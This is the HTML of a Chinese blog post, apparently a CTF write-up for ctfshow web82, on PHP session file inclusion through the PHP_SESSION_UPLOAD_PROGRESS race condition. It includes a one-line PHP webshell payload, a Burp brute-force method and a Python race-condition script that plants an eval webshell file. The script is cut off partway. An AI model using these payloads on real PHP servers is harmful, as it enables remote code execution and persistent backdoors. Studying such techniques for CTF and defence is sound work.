@@ -1,0 +1,465 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.2.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/header.jpg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/header.jpg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha256-XOqroi11tY4EFQMR9ZYwZWKj5ZXiftSx36RRuC3anlA=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"diurnal541.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="session基础 在PHP的配置文件中，有专门的session模块，用于配置session相关的设置，在该模块下有个session.save_path参数，如下所示：   这个参数设置了PHP的session存储位置，我们打开该参数指定的目录，果然发现了session文件，如下所示：   打开该文件可以发现其中的内容是反序列化后的内容，如下所示：   在实际的网站中，可能会存储很多用户的sess">
+<meta property="og:type" content="article">
+<meta property="og:title" content="session文件包含">
+<meta property="og:url" content="https://diurnal541.github.io/2024/06/05/session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/index.html">
+<meta property="og:site_name" content="Mouse">
+<meta property="og:description" content="session基础 在PHP的配置文件中，有专门的session模块，用于配置session相关的设置，在该模块下有个session.save_path参数，如下所示：   这个参数设置了PHP的session存储位置，我们打开该参数指定的目录，果然发现了session文件，如下所示：   打开该文件可以发现其中的内容是反序列化后的内容，如下所示：   在实际的网站中，可能会存储很多用户的sess">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://diurnal541.github.io/2024/06/05/session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20240605214649847.png">
+<meta property="og:image" content="https://diurnal541.github.io/2024/06/05/session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20240605214710337.png">
+<meta property="og:image" content="https://diurnal541.github.io/2024/06/05/session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20240605214953224.png">
+<meta property="og:image" content="https://diurnal541.github.io/2024/06/05/session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20240605215333241.png">
+<meta property="og:image" content="https://diurnal541.github.io/2024/06/05/session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20240605215356562.png">
+<meta property="og:image" content="https://diurnal541.github.io/2024/06/05/session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20240605215536959.png">
+<meta property="og:image" content="https://diurnal541.github.io/2024/06/05/session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20240605215549387.png">
+<meta property="og:image" content="https://diurnal541.github.io/2024/06/05/session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20240605215824838.png">
+<meta property="og:image" content="https://diurnal541.github.io/2024/06/05/session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20240605215900271.png">
+<meta property="og:image" content="https://diurnal541.github.io/2024/06/05/session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20240605215923155.png">
+<meta property="og:image" content="https://diurnal541.github.io/2024/06/05/session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20240605215928509.png">
+<meta property="og:image" content="https://diurnal541.github.io/2024/06/05/session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20240605215957379.png">
+<meta property="og:image" content="https://diurnal541.github.io/2024/06/05/session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20240605220034114.png">
+<meta property="og:image" content="https://diurnal541.github.io/2024/06/05/session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20240605220042848.png">
+<meta property="article:published_time" content="2024-06-05T13:32:01.000Z">
+<meta property="article:modified_time" content="2024-06-05T14:00:47.032Z">
+<meta property="article:author" content="Diurnal541">
+<meta property="article:tag" content="文件包含">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://diurnal541.github.io/2024/06/05/session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20240605214649847.png">
+
+
+<link rel="canonical" href="https://diurnal541.github.io/2024/06/05/session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://diurnal541.github.io/2024/06/05/session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/","path":"2024/06/05/session文件包含/","title":"session文件包含"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>session文件包含 | Mouse</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="Mouse" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+  <a target="_blank" rel="noopener" href="https://github.com/Diurnal541/" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Mouse</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">我的知识黄金小屋</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#session%E5%9F%BA%E7%A1%80"><span class="nav-number">1.</span> <span class="nav-text">session基础</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">2.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%9E%E4%BE%8B"><span class="nav-number">3.</span> <span class="nav-text">实例</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Diurnal541"
+      src="/images/header.jpg">
+  <p class="site-author-name" itemprop="name">Diurnal541</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">3</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Diurnal541" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Diurnal541" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:3334908802@qq.com" title="E-Mail → mailto:3334908802@qq.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://diurnal541.github.io/2024/06/05/session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/header.jpg">
+      <meta itemprop="name" content="Diurnal541">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Mouse">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="session文件包含 | Mouse">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          session文件包含
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2024-06-05 21:32:01 / 修改时间：22:00:47" itemprop="dateCreated datePublished" datetime="2024-06-05T21:32:01+08:00">2024-06-05</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">web安全</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="session基础"><a href="#session基础" class="headerlink" title="session基础"></a>session基础</h1><blockquote>
+<p>在PHP的配置文件中，有专门的session模块，用于配置session相关的设置，在该模块下有个session.save_path参数，如下所示：</p>
+<img src="/2024/06/05/session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20240605214649847.png" class="" title="image-20240605214649847">
+
+<p>这个参数设置了PHP的session存储位置，我们打开该参数指定的目录，果然发现了session文件，如下所示：</p>
+<img src="/2024/06/05/session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20240605214710337.png" class="" title="image-20240605214710337">
+
+<p>打开该文件可以发现其中的内容是反序列化后的内容，如下所示：</p>
+<img src="/2024/06/05/session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20240605214953224.png" class="" title="image-20240605214953224">
+
+<p>在实际的网站中，可能会存储很多用户的session信息，为了区分这些不同的session究竟属于哪个用户，需要用户以cookie的方式上传一个唯一的会话标识，这样PHP就可以根据用户上传的会话标识来查找用户所对应的session了。</p>
+<p>这里使用的是phpstudy，其中常见的存储目录如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/<span class="keyword">var</span>/lib/php/sess_PHPSESSID</span><br><span class="line">/<span class="keyword">var</span>/lib/php/sessions/sess_PHPSESSID</span><br><span class="line">/xxx/tmp/sess_PHPSESSID</span><br><span class="line">/xxxx/tmp/sessions/sess_PHPSESSID</span><br></pre></td></tr></table></figure>
+
+<p>在Linux系统中，常见的存储目录为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/<span class="keyword">var</span>/lib/php/session</span><br><span class="line">/<span class="keyword">var</span>/lib/php</span><br><span class="line">/<span class="keyword">var</span>/lib/php/sessions</span><br><span class="line">/tmp/</span><br><span class="line">/tmp/sessions/</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><blockquote>
+<p>在某些情景下，<code>.</code>可能会被过滤，而在PHP中唯一我们能控制的没有后缀的文件就是session文件</p>
+<p>利用PHP_SESSION_UPLOAD_PROGRESS写入session文件加条件竞争达到文件包含的目的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>. session.upload_progress.enabled = on</span><br><span class="line"><span class="number">2</span>. session.upload_progress.cleanup = on（默认开启）</span><br><span class="line"><span class="number">3</span>. session.upload_progress.prefix = <span class="string">&quot;upload_progress_&quot;</span>（默认）</span><br><span class="line"><span class="number">4</span>. session.upload_progress.name = <span class="string">&quot;<span class="subst">$PHP_SESSION_UPLOAD_PROGRESS</span>&quot;</span>（默认）</span><br><span class="line"></span><br><span class="line">enabled=on表示upload_progress功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中；</span><br><span class="line"></span><br><span class="line">cleanup=on表示当文件上传结束后，php将会立即清空对应session文件中的内容；</span><br><span class="line"></span><br><span class="line">name当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控也就是PHP_SESSION_UPLOAD_PROGRESS的值可控；</span><br><span class="line"></span><br><span class="line">prefix+name将表示为session中的键名</span><br></pre></td></tr></table></figure>
+
+<img src="/2024/06/05/session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20240605215333241.png" class="" title="image-20240605215333241">
+
+<img src="/2024/06/05/session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20240605215356562.png" class="" title="image-20240605215356562">
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">大体思路为：</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>、post一个与ini中设置的session.upload_progress.name的同名变量（默认的name为“PHP_SESSION_UPLOAD_PROGRESS”），那么就会返回上传文件的实时进度并写入session文件中。session文件的内容为:（它会在<span class="variable">$_SESSION</span>中添加一组数据, 索引是session.upload_progress.prefix与 session.upload_progress.name连接在一起的值）</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、如果我们post传递PHP_SESSION_UPLOAD_PROGRESS的值为一句话木马</span><br><span class="line"></span><br><span class="line">比如为：<span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>);<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>、同时，我们在cookie里面设置名字：PHPSESSID，值：flag，（目的是设置session文件，因为这样我们才能知道实时进度（一句话木马）上传到哪里了）；那么在/tem/sess_flag这个文件的内容就为upload_progress_<span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>)<span class="meta">?&gt;</span>。然后在<span class="keyword">include</span>（/tem/sess_flag）就会执行后面的php代码从而成功执行rce。</span><br><span class="line"></span><br><span class="line"><span class="number">4</span>、虽然文件上传结束后，php会清空session文件中的内容，但是如果我们边上传边去访问/tem/sess_aaa进行条件竞争，那么就有可能在删除session文件前访问到这个文件。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">我们能够创建session文件的原因：session里有一个默认选项，session.use_strict_mode默认值为off。</span><br><span class="line">也就是说此时用户是可以自己定义Session ID的。比如，我们在Cookie里设置PHPSESSID=aaa，PHP将会在服务器上创建一个文件：/tmp/sess_aaa”。</span><br><span class="line">即使此时用户没有初始化Session，PHP也会自动初始化Session,并产生一个键值。这个键值ini.<span class="title function_ invoke__">get</span>(<span class="string">&quot;session.upload_progress.prefix&quot;</span>)+由我们构造的session.upload_progress.name值组成，最后被写入sess_aaa文件里。</span><br></pre></td></tr></table></figure>
+
+<img src="/2024/06/05/session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20240605215536959.png" class="" title="image-20240605215536959">
+
+<img src="/2024/06/05/session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20240605215549387.png" class="" title="image-20240605215549387">
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">但是session.upload_progress.cleanup默认是开启的，一旦读取了所有POST数据，它就会清除进度信息，把我们session文件里的内容全部删除。所以这里我们需要利用条件竞争来读取session文件。</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h1 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h1><blockquote>
+<p>这里以ctfshow的web82为例，有两种方法</p>
+<ol>
+<li><p>BP抓包方法-手动爆破：</p>
+<ul>
+<li><p>先构造一个上传文件的页面，对环境上传一个任意的文件，内容也任意，然后抓包</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://ffa3a732-3c6b-4e9e-a1aa-7577baada547.challenge.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>修改上传文件包</p>
+<img src="/2024/06/05/session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20240605215824838.png" class="" title="image-20240605215824838">
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">注意两点：</span><br><span class="line">（<span class="number">1</span>）设置Cookie：PHPSEESSID=flag、这样我们的session就为/tmp/sess_flag</span><br><span class="line">（<span class="number">2</span>）设置同名变量PHP_SESSION_UPLOAD_PROGRESS，设置值为我们想要存入session文件的代码。（把第一步中value=<span class="number">123</span>的改掉即可，这里对<span class="number">123</span>加上§§是为了进行爆破payload用）</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>包含session文件，抓包，这里§a§是为了爆破payload用</p>
+<img src="/2024/06/05/session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20240605215900271.png" class="" title="image-20240605215900271">
+</li>
+<li><p>进行爆破，将两个爆破的设置都改为null payloads，然后一起爆破（先对上传文件包点击attack，在对&#x2F;tmp&#x2F;sess_flag文件包含包点击attack，也可以不管顺序，因为爆破次数有很多)</p>
+<img src="/2024/06/05/session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20240605215923155.png" class="" title="image-20240605215923155">
+
+<img src="/2024/06/05/session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20240605215928509.png" class="" title="image-20240605215928509">
+
+<p>再将指令改为system(“tac fl0g.php”);即可拿到flag</p>
+<img src="/2024/06/05/session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20240605215957379.png" class="" title="image-20240605215957379"></li>
+</ul>
+</li>
+<li><p>脚本方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import io</span><br><span class="line">import threading</span><br><span class="line"> </span><br><span class="line">url=<span class="string">&#x27;http://08d4a04e-19b3-4049-8a81-e9c6226eee2f.challenge.ctf.show:8080/&#x27;</span></span><br><span class="line"><span class="comment">#设置PHPSESSID的值</span></span><br><span class="line">sessionid=<span class="string">&#x27;ctfshow&#x27;</span>     </span><br><span class="line">data=&#123;<span class="string">&quot;1&quot;</span>:<span class="string">&quot;file_put_contents(&#x27;/var/www/html/tao.php&#x27;,&#x27;&lt;?php eval(<span class="subst">$_POST</span>[2]);?&gt;&#x27;);&quot;</span>&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">#为了进行条件竞争，需要一边写一边读</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#进行上传文件时需要post传递名为PHP_SESSION_UPLOAD_PROGRESS值为一句话木马</span></span><br><span class="line">def <span class="title function_ invoke__">write</span>(session):</span><br><span class="line">	fileBytes = io.<span class="title function_ invoke__">BytesIO</span>(b<span class="string">&#x27;a&#x27;</span>*<span class="number">1024</span>*<span class="number">50</span>)          <span class="comment">#生产一个50k的文件</span></span><br><span class="line">	<span class="keyword">while</span> True:</span><br><span class="line">		response=session.<span class="title function_ invoke__">post</span>(url,</span><br><span class="line">			data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>&#125;,</span><br><span class="line">			cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:sessionid&#125;,</span><br><span class="line">			files=&#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;ctfshow.jpg&#x27;</span>,fileBytes)&#125;    <span class="comment">#设置文件名字和内容</span></span><br><span class="line">			)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">#读取session文件，这里文件为/tmp/sess_ctfshow</span></span><br><span class="line"> </span><br><span class="line">def <span class="title function_ invoke__">read</span>(session):</span><br><span class="line">	<span class="keyword">while</span> True:</span><br><span class="line">		response=session.<span class="title function_ invoke__">post</span>(url+<span class="string">&#x27;?file=/tmp/sess_&#x27;</span>+sessionid,data=data)</span><br><span class="line">		response2=session.<span class="title function_ invoke__">get</span>(url+<span class="string">&#x27;tao.php&#x27;</span>);</span><br><span class="line">		<span class="keyword">if</span> response2.status_code==<span class="number">200</span>:</span><br><span class="line">			<span class="keyword">print</span>(<span class="string">&#x27;++++++++++++++++++++&#x27;</span>)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="keyword">print</span>(response2.status_code)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"> </span><br><span class="line">	<span class="comment">#开启多线程进行竞争	</span></span><br><span class="line">	evnet=threading.<span class="title function_ invoke__">Event</span>()</span><br><span class="line">	with requests.<span class="title function_ invoke__">session</span>() <span class="keyword">as</span> session:			